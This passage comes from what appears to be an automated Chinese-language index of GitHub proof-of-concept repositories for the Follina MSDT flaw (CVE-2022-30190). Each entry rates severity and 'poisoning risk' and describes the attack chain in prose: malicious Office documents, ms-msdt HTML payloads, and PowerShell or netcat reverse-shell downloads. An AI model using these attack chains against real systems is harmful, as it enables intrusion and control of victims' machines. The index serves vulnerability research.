**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
